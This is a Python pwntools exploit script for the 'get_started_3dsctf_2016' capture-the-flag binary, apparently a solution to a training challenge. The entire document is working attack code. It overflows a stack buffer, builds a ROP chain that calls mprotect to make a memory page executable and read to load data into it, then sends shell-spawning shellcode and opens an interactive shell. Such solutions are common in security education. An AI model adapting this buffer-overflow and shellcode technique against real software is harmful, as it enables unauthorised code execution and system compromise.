from pwn import *
elf = ELF('./get_started_3dsctf_2016')
r = process('./get_started_3dsctf_2016')
pop3_ret = 0x804951D
mem_addr = 0x80ec000 
mem_size = 0x1000    
mem_proc = 0x7       

mprotect_addr = elf.symbols['mprotect']
read_addr = elf.symbols['read']


payload  = 'A' * 0x38
payload += p32(mprotect_addr)
payload += p32(pop3_ret) 
payload += p32(mem_addr) 
payload += p32(mem_size)  
payload += p32(mem_proc)   
payload += p32(read_addr)
payload += p32(pop3_ret)  
payload += p32(0)     
payload += p32(mem_addr)   
payload += p32(0x1000) 
payload += p32(mem_addr) 

r.sendline(payload)
payload = asm(shellcraft.sh()) 
r.sendline(payload)
r.interactive()